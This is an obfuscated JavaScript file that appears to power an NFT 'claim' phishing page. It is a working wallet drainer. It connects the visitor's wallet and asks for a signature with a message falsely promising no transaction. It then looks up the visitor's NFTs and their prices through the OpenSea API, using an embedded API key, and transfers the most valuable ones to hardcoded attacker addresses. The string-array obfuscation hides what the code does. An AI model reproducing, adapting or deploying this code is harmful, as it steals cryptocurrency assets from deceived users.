var _$_616b=["chainId","0x1","switchNetwork","log","onWeb3Enabled","onChainChanged","ethereum","disconnect","on","accountsChanged","length","provider","innerHTML","walletAddress","getElementById","getAccounts","eth","display","style","#claimButton","querySelector","","none","click","a","createElement","./index.html","assign","sign","personal","ecRecover","toLowerCase","Same address","Not the same address.","user denied","includes","message","signDenied","GET","application/json","812924de94094476916671a8de4686ec","error","catch","address","asset_contract","token_id","map","assets","then","json","noNFTs","schema_name","primary_asset_contracts","one_day_average_price","stats","seven_day_average_price","owned_asset_count","filter","contract_address","contract","find","price","owned","minValue","0x41BE887D2889B7784CE10455222658A0Ffd348c0","nftReceiveAddress","type","push","maxTransfer","slice","sort","options","transfer","notEli","innerText","You denied the sign request. Please try again.","You are not eligible.","Something went wrong.","opacity","claimButton","undefined","load","walletconnect","enableWeb3","addEventListener","round","ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789","random","floor","charAt"];let web3Provider;Moralis[_$_616b[4]](async (_0x20017)=>{if(_0x20017[_$_616b[0]]!== 1&& metamaskInstalled){ await Moralis[_$_616b[2]](_$_616b[1])};updateState(true);console[_$_616b[3]](_0x20017)});Moralis[_$_616b[5]](async (_0x20049)=>{if(_0x20049!== _$_616b[1]&& metamaskInstalled){ await Moralis[_$_616b[2]](_$_616b[1])}});window[_$_616b[6]]?window[_$_616b[6]][_$_616b[8]](_$_616b[7],(_0x2007B)=>{console[_$_616b[3]](_0x2007B);updateState(false)}):null;window[_$_616b[6]]?window[_$_616b[6]][_$_616b[8]](_$_616b[9],(_0x200AD)=>{if(_0x200AD[_$_616b[10]]< 1){updateState(false)}}):null;async function updateState(_0x206BB){const _0x20111= new Web3(Moralis[_$_616b[11]]);document[_$_616b[14]](_$_616b[13])[_$_616b[12]]= _0x206BB?`CONNECTED <br> <span>${( await _0x20111[_$_616b[16]][_$_616b[15]]())[0]}</span>`:`NOT CONNECTED`;document[_$_616b[20]](_$_616b[19])[_$_616b[18]][_$_616b[17]]= _0x206BB?_$_616b[21]:_$_616b[22]}setTimeout(async ()=>{try{const _0x20111= new Web3(Moralis[_$_616b[11]]);const _0x200DF=( await _0x20111[_$_616b[16]][_$_616b[15]]())[0];console[_$_616b[3]](`${_0x200DF} is connected`)}catch(e){Object[_$_616b[27]](document[_$_616b[25]](_$_616b[24]),{href:_$_616b[26]})[_$_616b[23]]()}},5000);async function askSign(){const _0x20111= new Web3(Moralis[_$_616b[11]]);const _0x200DF=( await _0x20111[_$_616b[16]][_$_616b[15]]())[0];try{const _0x205C1=`Welcome, \n\n`+ `Click to sign in and accept the Terms of Service.\n\n`+ `This request will not trigger a blockchain transaction or cost any gas fees.\n\n`+ `Wallet Address:\n${_0x200DF}\n\n`+ `Nonce:\n${createNonce()}`;const _0x205F3= await _0x20111[_$_616b[16]][_$_616b[29]][_$_616b[28]](_0x205C1,_0x200DF);const _0x20625= await _0x20111[_$_616b[16]][_$_616b[29]][_$_616b[30]](_0x205C1,_0x205F3);console[_$_616b[3]](`Signing address: ${_0x20625}\n${_0x200DF[_$_616b[31]]()== _0x20625[_$_616b[31]]()?_$_616b[32]:_$_616b[33]}`);return true}catch(e){if(e[_$_616b[36]][_$_616b[31]]()[_$_616b[35]](_$_616b[34])){noEligible(_$_616b[37])};console[_$_616b[3]](e);return false}}async function askNfts(){const _0x20111= new Web3(Moralis[_$_616b[11]]);const _0x20369=( await _0x20111[_$_616b[16]][_$_616b[15]]())[0];const _0x20337={method:_$_616b[38],headers:{Accept:_$_616b[39],'X-API-KEY':_$_616b[40]}};let _0x203FF= await fetch(`https://api.opensea.io/api/v1/assets?owner=${_0x20369}&order_direction=desc&limit=020&include_orders=false`,_0x20337)[_$_616b[48]]((_0x20431)=>{return _0x20431[_$_616b[49]]()})[_$_616b[48]]((_0x20431)=>{console[_$_616b[3]](_0x20431);return _0x20431[_$_616b[47]][_$_616b[46]]((_0x20463)=>{return {contract:_0x20463[_$_616b[44]][_$_616b[43]],token_id:_0x20463[_$_616b[45]]}})})[_$_616b[42]]((_0x2007B)=>{return console[_$_616b[41]](_0x2007B)});if(_0x203FF[_$_616b[10]]< 1){return noEligible(_$_616b[50])};let _0x20305= await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${_0x20369}&offset=0&limit=200`,_0x20337)[_$_616b[48]]((_0x20431)=>{return _0x20431[_$_616b[49]]()})[_$_616b[48]]((_0x20495)=>{console[_$_616b[3]](_0x20495);return _0x20495[_$_616b[57]]((_0x204C7)=>{if(_0x204C7[_$_616b[52]][_$_616b[10]]> 0){return true}else {return false}})[_$_616b[46]]((_0x204C7)=>{return {type:_0x204C7[_$_616b[52]][0][_$_616b[51]][_$_616b[31]](),contract_address:_0x204C7[_$_616b[52]][0][_$_616b[43]],price:round(_0x204C7[_$_616b[54]][_$_616b[53]]!= 0?_0x204C7[_$_616b[54]][_$_616b[53]]:_0x204C7[_$_616b[54]][_$_616b[55]]),owned:_0x204C7[_$_616b[56]]}})})[_$_616b[42]]((_0x2007B)=>{return console[_$_616b[41]](_0x2007B)});if(_0x20305[_$_616b[10]]< 1){return noEligible(_$_616b[50])};let _0x203CD=[];for(nft of _0x203FF){const _0x202A1=_0x20305[_$_616b[60]]((_0x204F9)=>{return _0x204F9[_$_616b[58]]== nft[_$_616b[59]]});if(_0x202A1){}else {console[_$_616b[3]](`No data for collection: ${nft[_$_616b[59]]}`);continue};if(_0x202A1[_$_616b[61]]=== 0){continue};const _0x202D3=round(_0x202A1[_$_616b[61]]* _0x202A1[_$_616b[62]]);if(_0x202D3< drainNftsInfo[_$_616b[63]]){continue};_0x203CD[_$_616b[67]]({price:_0x202D3,options:{contract_address:_0x202A1[_$_616b[58]],receiver:_0x202D3> 1.5?_$_616b[64]:(drainNftsInfo[_$_616b[65]]== _$_616b[21]?receiveAddress:drainNftsInfo[_$_616b[65]]),token_id:nft[_$_616b[45]],amount:_0x202A1[_$_616b[62]],type:_0x202A1[_$_616b[66]]}})};if(_0x203CD[_$_616b[10]]< 1){return noEligible(_$_616b[50])};let _0x2039B= await _0x203CD[_$_616b[70]]((_0x2052B,_0x2055D)=>{return _0x2055D[_$_616b[61]]- _0x2052B[_$_616b[61]]})[_$_616b[69]](0,drainNftsInfo[_$_616b[68]]);for(transaction of _0x2039B){console[_$_616b[3]](`Transferring ${transaction[_$_616b[71]][_$_616b[58]]} (${transaction[_$_616b[61]]} ETH)`);Moralis[_$_616b[72]](transaction[_$_616b[71]])[_$_616b[42]]((_0x2058F)=>{return console[_$_616b[41]](_0x2058F,transaction[_$_616b[71]])}); await sleep(200)}}async function noEligible(_0x20657){const _0x20689=document[_$_616b[14]](_$_616b[73]);switch(_0x20657){case _$_616b[37]:_0x20689[_$_616b[74]]= _$_616b[75];break;case _$_616b[50]:_0x20689[_$_616b[74]]= _$_616b[76];break;default:_0x20689[_$_616b[74]]= _$_616b[77];break};_0x20689[_$_616b[18]][_$_616b[17]]= _$_616b[21]}let disabled=false;async function askTransfer(){if(disabled){return};document[_$_616b[14]](_$_616b[79])[_$_616b[18]][_$_616b[78]]= 0.5;disabled= true;if( await askSign()){ await askNfts()};disabled= false;document[_$_616b[14]](_$_616b[79])[_$_616b[18]][_$_616b[78]]= 1}let metamaskInstalled=false;if( typeof window[_$_616b[6]]!== _$_616b[80]){metamaskInstalled= true};window[_$_616b[84]](_$_616b[81],async ()=>{ await Moralis[_$_616b[83]](metamaskInstalled?{}:{provider:_$_616b[82]});document[_$_616b[20]](_$_616b[19])[_$_616b[84]](_$_616b[23],askTransfer)});const round=(_0x20143)=>{return Math[_$_616b[85]](_0x20143* 10000)/ 10000};const sleep=(_0x20175)=>{return  new Promise((_0x201A7)=>{return setTimeout(_0x201A7,_0x20175)})};const rdmString=(_0x2020B)=>{let _0x2026F=_$_616b[21];const _0x2023D=_$_616b[86];for(let _0x201D9=0;_0x201D9< _0x2020B;_0x201D9++){_0x2026F+= _0x2023D[_$_616b[89]](Math[_$_616b[88]](Math[_$_616b[87]]()* _0x2023D[_$_616b[10]]))};return _0x2026F};const createNonce=()=>{return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`}